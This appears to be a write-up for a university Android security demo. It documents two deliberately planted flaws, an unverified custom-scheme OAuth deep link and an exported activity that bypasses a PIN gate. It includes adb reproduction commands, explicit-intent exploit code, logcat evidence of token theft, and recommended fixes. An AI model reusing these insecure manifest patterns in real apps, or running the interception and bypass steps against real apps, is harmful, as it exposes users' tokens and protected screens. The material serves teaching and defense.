# Planted Vulnerabilities — Offensive PoC

This document inventories the two deliberate vulnerabilities planted in the
`VulnerableTarget` app for the offensive proof-of-concept. Each entry lists
where the vulnerability lives, the exact attack that exploits it, the observed
effect, and the fix the defensive auditor will recommend.

The two attacks share a delivery surface — a QR code carrying a
`smdpoc://` URI — but exploit different weaknesses.

| # | Vulnerability | Component | CWE | Severity |
|---|---|---|---|---|
| 1 | Custom-scheme deep link, no origin verification | `DeepLinkActivity` | [CWE-939](https://cwe.mitre.org/data/definitions/939.html) Improper Authorization in Handler for Custom URL Scheme | High |
| 2 | Exported activity without permission guard | `InternalActivity` | [CWE-926](https://cwe.mitre.org/data/definitions/926.html) Improper Export of Android Application Components | High |

---

## V1 — OAuth token interception via scheme collision

### Where
`VulnerableTarget/app/src/main/AndroidManifest.xml` — `DeepLinkActivity` is
exported with an intent-filter on a custom scheme, BROWSABLE, and **no
`android:autoVerify`**:

```xml
<activity
    android:name=".DeepLinkActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:scheme="smdpoc" android:host="oauth" />
    </intent-filter>
</activity>
```

`DeepLinkActivity.kt` extracts the token directly from the URI and treats it as
a logged-in session — no origin or signature check.

### How a real attack lands
1. The attacker publishes a separate APK (`MaliciousCompanion`) that registers
   the **same** `<scheme="smdpoc", host="oauth">` filter.
2. When any URI with that scheme is dispatched (e.g. the OAuth provider's
   redirect, or a QR scan), Android's Intent Resolver finds **two** matching
   handlers and shows the disambiguation chooser.
3. With no cryptographic binding between the scheme and the legitimate app, the
   user has no way to tell which entry is the real one.
4. If the user picks the malicious app — or Android auto-resolves to it because
   of "Always" defaults — the attacker receives the OAuth callback URI,
   including the access token in the query string.

### Reproduction (in the demo)
With both apps installed on the AVD:

```bash
adb shell am start -W -a android.intent.action.VIEW \
  -d 'smdpoc://oauth/callback?token=REAL_USER_SESSION_42'
```

Android shows the chooser. Picking `MaliciousCompanion` displays
`STOLEN TOKEN: REAL_USER_SESSION_42` in the attacker UI; the legitimate
`DeepLinkActivity` never runs.

The same effect is achieved if the user scans the QR rendered by
`payload-gen/payload_gen.py` (preset: `oauth`).

### Fix the defensive auditor will recommend
- Replace the custom scheme with **Android App Links**: switch to `https://`
  with `android:autoVerify="true"` and publish a Digital Asset Links
  (`/.well-known/assetlinks.json`) record on the OAuth provider's host so the
  OS binds the link to this app's signing key.
- Until that's possible, validate the OAuth `state` parameter on the client
  and treat tokens delivered through unverified channels as untrusted.

---

## V2 — Intent injection into an exported "internal" activity

### Where
Same manifest:

```xml
<activity
    android:name=".InternalActivity"
    android:exported="true" />
```

`InternalActivity` is supposed to require the user to clear the PIN gate in
`MainActivity` first, but:

- it is marked `exported="true"`;
- there is no `android:permission` attribute on the `<activity>`;
- the activity itself does no auth check in `onCreate`.

### How a real attack lands
Any other app on the device can launch this activity directly by constructing
an **explicit** `Intent` with its `ComponentName`. No URI scheme, no chooser,
no user interaction.

`MaliciousCompanion`'s handler does exactly that when it receives a QR-derived
`smdpoc://internal/...` URI:

```kotlin
val explicit = Intent().apply {
    component = ComponentName("ro.upb.smd.poc.target",
                              "ro.upb.smd.poc.target.InternalActivity")
    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
}
startActivity(explicit)
```

### Reproduction (in the demo)
Three equivalent paths, all skip the PIN gate:

```bash
# A. Direct adb — proves the activity is reachable from outside.
adb shell am start -n ro.upb.smd.poc.target/.InternalActivity

# B. QR-delivered trigger routed through MaliciousCompanion.
adb shell am start -W -a android.intent.action.VIEW \
  -d 'smdpoc://internal/launch?cmd=show_secret'

# C. The "Force-launch target's InternalActivity" button in MaliciousCompanion.
```

In all three cases the emulator jumps straight to the "sensitive settings"
screen, displaying the mock account balance and API key without the user ever
typing `1234`.

### Fix the defensive auditor will recommend
- Set `android:exported="false"` on `InternalActivity`.
- If the activity legitimately needs to be reachable from another app, gate it
  with a **signature-level** `android:permission` so only apps signed by the
  same developer key can launch it.
- Add a server-side / in-process auth check inside `InternalActivity.onCreate`
  so a misconfigured manifest does not give immediate access.

---

## Logcat evidence

With the AVD running and the malicious flow exercised:

```
W ATTACKER: Intercepted OAuth callback. token=REAL_USER_SESSION_42 uri=smdpoc://oauth/callback?token=REAL_USER_SESSION_42
W ATTACKER: Forwarding to target's InternalActivity. uri=smdpoc://internal/launch?cmd=show_secret
W TARGET:   InternalActivity launched. caller=(unknown)
```

The `caller=(unknown)` line is the smoking gun for V2: `referrer` is null
because the launch did not originate from a navigation inside the target's
own task — i.e. the PIN gate was bypassed.

---

## Files involved

| Role | Path |
|---|---|
| Vulnerable target | `VulnerableTarget/app/src/main/AndroidManifest.xml` |
| V1 sink | `VulnerableTarget/app/src/main/java/ro/upb/smd/poc/target/DeepLinkActivity.kt` |
| V2 sink | `VulnerableTarget/app/src/main/java/ro/upb/smd/poc/target/InternalActivity.kt` |
| Malicious companion | `MaliciousCompanion/app/src/main/AndroidManifest.xml`, `…/MainActivity.kt` |
| QR payload generator | `payload-gen/payload_gen.py` |
